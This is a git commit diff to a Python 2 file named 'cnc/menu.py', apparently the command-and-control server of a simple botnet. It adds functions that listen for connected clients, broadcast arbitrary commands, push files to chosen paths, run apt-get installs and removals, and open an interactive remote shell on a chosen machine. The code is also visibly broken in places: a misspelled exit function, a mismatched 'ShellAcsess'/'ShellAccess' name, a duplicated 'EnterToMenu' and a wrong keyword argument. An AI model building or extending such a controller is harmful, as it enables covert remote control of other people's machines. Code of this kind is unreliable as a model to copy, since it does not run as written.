3950d641e2240d5a5b1f5a6ac5cdf04b50ef67b3
Feigelman Evgeny <namlegief@gmaail.com>
2016-12-29 22:34:35 +0200

    Added functions;

--- cnc/menu.py
+++ cnc/menu.py
@@ -1,42 +1,174 @@
 from thread import start_new_thread
 from cnc import network
 from cnc import time
+from socket import socket, AF_INET, SOCK_STREAM ,SOL_SOCKET,SO_REUSEADDR,gethostbyaddr,error
+from os import system
+from time import sleep
+from sys import exit as exitap
 
+# Connections
+host = ''
+port = 1234
+buffer_size = 4096
+connections = []
+max_connections = 5
+# Socket Handling
+sock = socket(AF_INET,SOCK_STREAM)
+sock.setsockopt(SOL_SOCKET,SO_REUSEADDR, 1)
+###try to bind###
+try:
+    sock.bind((host, port))
+except error as msg:
+    # debug level
+    #print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+    print "Socket Error: %s" % msg
+    exitapp()
+sock.listen(max_connections)
 
+def GetConnections():
+    num = 1
+    for client in connections:
+        ip = client[1][0]
+        hostname = gethostbyaddr(ip)[0]
+        print "{}) ip {} - {}" .format(num, ip, hostname)
+        num += 1
 
 def ShowClients():
-    print 'show'
+    print "Clients:"
+    GetConnections()
     EnterToMenu()
 
 
 def SendCommand():
-    print 'send'
+    GetConnections()
+    inp = int(raw_input("Enter Client Number or 0 for all "))
+    com = raw_input("Enter Command: ")
+    if inp == 0:
+        for i in connections:
+            try:
+                i[0].send(com)
+                print(i[1], " success")
+                sleep(1)
+                print(i[0].recv(buffer_size))
+            except:
+                print(i[1], " failed")
+                connections.remove(i)
+                break
+    else:
+        try:
+            connections[inp - 1][0].send(com)
+            print(connections[inp - 1][1], "success")
+            print(connections[inp - 1][0].recv(buffer_size))
+        except:
+            print(connections[inp - 1][1], "failed")
+            connections.remove(connections[inp - 1])
+            return
     EnterToMenu()
 
 
 def SendFile():
-    print 'sendfile'
+    GetConnections()
+    inp = int(raw_input("Enter Client Number or 0 for all "))
+    sourcefile = raw_input("Enter Source ")
+    destination = raw_input("Enter Destination ")
+    if inp == 0:
+        for i in connections:
+            try:
+                i[0].send("F")
+                print(i[1], " success")
+            except:
+                print(i[1], " failed")
+                connections.remove(i)
+                break
+            sleep(1)
+            i[0].send(destination)
+            f = open(sourcefile, 'rb')
+            l = f.read(1024)
+            while (l):
+                i[0].send(l)
+                l = f.read(1024)
+            f.close()
+            i[0].send("E")
+    else:
+        try:
+            connections[inp - 1][0].send("F")
+            print(connections[inp - 1][1], "success")
+        except:
+            print(connections[inp - 1][1], " failed")
+            connections.remove(connections[inp - 1])
+            return
+        sleep(1)
+        connections[inp - 1][0].send(destination)
+        f = open(sourcefile, 'rb')
+        l = f.read(1024)
+        while (l):
+            connections[inp - 1][0].send(l)
+            l = f.read(1024)
+        f.close()
+        sleep(1)
+        connections[inp - 1][0].send("E")
+    EnterToMenu()
+
+def InstallAndRemove(TypeAction):
+    GetConnections()
+    inp = int(raw_input("Enter Client Number or 0 for all "))
+    program = raw_input("Enter Source Program ")
+    actioncmd = "apt-get -y {} {}" .format(TypeAction, program)
+    if inp == 0:
+        for i in connections:
+            try:
+                i[0].send("package")
+                print(i[1], " success")
+            except:
+                print(i[1], " failed")
+                connections.remove(i)
+                break
+            sleep(1)
+            i[0].send(actioncmd)
+    else:
+        try:
+            connections[inp - 1][0].send("package")
+            print(connections[inp - 1][1], " success")
+        except:
+            print(connections[inp - 1][1], " failed")
+            connections.remove(connections[inp - 1])
+            return
+        sleep(1)
+        connections[inp - 1][0].send(actioncmd)
     EnterToMenu()
 
 
-def install():
-    print 'install'
-    EnterToMenu()
 
-
-def remove():
-    print 'remove'
-    EnterToMenu()
-
-
-def ShellAccess():
-    print 'shell'
-    EnterToMenu()
+def ShellAcsess():
+    GetConnections()
+    inp = int(raw_input("Enter Client Number "))
+    print "Remmber Enter exit, to close the exit!"
+    while True:
+        commandtosend = raw_input("-> ")
+        if (commandtosend == "exit"):
+            print "Exiting...."
+            EnterToMenu()
+        try:
+            connections[inp - 1][0].send("shell")
+            connections[inp - 1][0].send(commandtosend)
+            print(connections[inp - 1][0].recv(buffer_size))
+        except:
+            print(connections[inp - 1][1], " failed")
+            connections.remove(connections[inp - 1])
+            return
+    sleep(1)
 
 
 def NotFound():
     print "Option not found!"
-    menu(arg=1)
+    menu(a=1)
+
+
+def EnterToMenu():
+    try:
+        input("Hit Enter to Back Menu..")
+    except:
+        menu(a=1)
 
 
 def EnterToMenu():
@@ -75,8 +207,8 @@ def menu(arg=False):
         "1": ShowClients,
         "2": SendCommand,
         "3": SendFile,
-        "4": install,
-        "5": remove,
+        "4": lambda : InstallAndRemove(TypeAction="install"),
+        "5": lambda : InstallAndRemove(TypeAction="remove"),
         "6": ShellAccess
     }
     choice.get(userChose, NotFound)()
